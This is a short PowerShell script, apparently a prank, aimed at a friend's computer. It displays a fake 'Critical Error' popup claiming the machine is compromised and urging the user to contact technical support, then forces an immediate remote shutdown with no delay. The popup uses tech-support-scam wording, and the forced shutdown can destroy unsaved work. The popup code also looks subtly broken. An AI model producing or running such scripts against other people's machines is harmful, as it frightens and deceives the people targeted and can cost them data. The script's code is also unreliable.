$targetComputer = "\\FriendComputerName"
$shutdownMessage = "Your computer has been compromised. Please contact technical support."

# Send a fake shutdown message
New-Object -ComObject WScript.Shell -Property @{
    Popup = "true";
    Text = $shutdownMessage;
    Timeout = 60;
    Title = "Critical Error"
}

# Initiate a forced system shutdown
Invoke-Command -ComputerName $targetComputer -ScriptBlock {
    Shutdown.exe /s /f /t 0
}
